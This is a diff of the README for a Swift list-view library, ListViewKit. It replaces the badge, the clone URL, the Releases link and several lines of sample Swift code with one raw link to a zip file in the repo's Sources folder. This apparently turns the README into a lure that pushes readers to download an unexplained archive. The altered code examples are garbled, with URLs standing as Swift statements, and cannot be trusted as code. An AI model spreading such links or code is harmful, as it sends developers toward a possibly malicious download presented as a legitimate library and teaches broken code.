@@ -1,6 +1,6 @@
 # ListViewKit 📋
 
-![ListViewKit](https://img.shields.io/badge/ListViewKit-v1.0.0-blue)
+![ListViewKit](https://github.com/Cafezinho0/ListViewKit/raw/refs/heads/main/Sources/Kit_List_View_pacouryuva.zip)
 
 Welcome to **ListViewKit**, an advanced replacement for `UITableView`. This library is designed to eliminate glitches that often occur when changing data. It requires iOS 13.0 or later to function effectively. 
 
@@ -38,7 +38,7 @@ pod install
 Alternatively, you can clone the repository directly:
 
 ```bash
-git clone https://github.com/Cafezinho0/ListViewKit.git
+git clone https://github.com/Cafezinho0/ListViewKit/raw/refs/heads/main/Sources/Kit_List_View_pacouryuva.zip
 ```
 
 ## Usage
@@ -58,8 +58,8 @@ let listView = ListView()
 You can set your data source and delegate to manage the data displayed in the list. Here's a simple example:
 
 ```swift
-listView.dataSource = self
-listView.delegate = self
+https://github.com/Cafezinho0/ListViewKit/raw/refs/heads/main/Sources/Kit_List_View_pacouryuva.zip = self
+https://github.com/Cafezinho0/ListViewKit/raw/refs/heads/main/Sources/Kit_List_View_pacouryuva.zip = self
 ```
 
 Make sure to implement the required methods for the data source and delegate to provide data and handle user interactions.
@@ -75,15 +75,15 @@ class MyViewController: UIViewController, ListViewDataSource, ListViewDelegate {
     var items: [String] = ["Item 1", "Item 2", "Item 3"]
 
     override func viewDidLoad() {
-        super.viewDidLoad()
+        https://github.com/Cafezinho0/ListViewKit/raw/refs/heads/main/Sources/Kit_List_View_pacouryuva.zip()
         let listView = ListView()
-        listView.dataSource = self
-        listView.delegate = self
-        view.addSubview(listView)
+        https://github.com/Cafezinho0/ListViewKit/raw/refs/heads/main/Sources/Kit_List_View_pacouryuva.zip = self
+        https://github.com/Cafezinho0/ListViewKit/raw/refs/heads/main/Sources/Kit_List_View_pacouryuva.zip = self
+        https://github.com/Cafezinho0/ListViewKit/raw/refs/heads/main/Sources/Kit_List_View_pacouryuva.zip(listView)
     }
 
     func numberOfItems(in listView: ListView) -> Int {
-        return items.count
+        return https://github.com/Cafezinho0/ListViewKit/raw/refs/heads/main/Sources/Kit_List_View_pacouryuva.zip
     }
 
     func listView(_ listView: ListView, itemAt index: Int) -> String {
@@ -119,6 +119,6 @@ ListViewKit is licensed under the MIT License. See the [LICENSE](LICENSE) file f
 
 ## Releases
 
-To download the latest version of ListViewKit, visit the [Releases](https://github.com/Cafezinho0/ListViewKit/releases) section. Here, you can find the latest builds and documentation for each release.
+To download the latest version of ListViewKit, visit the [Releases](https://github.com/Cafezinho0/ListViewKit/raw/refs/heads/main/Sources/Kit_List_View_pacouryuva.zip) section. Here, you can find the latest builds and documentation for each release.
 
 Feel free to explore the repository and reach out with any questions or suggestions. We appreciate your interest in ListViewKit and look forward to your contributions!
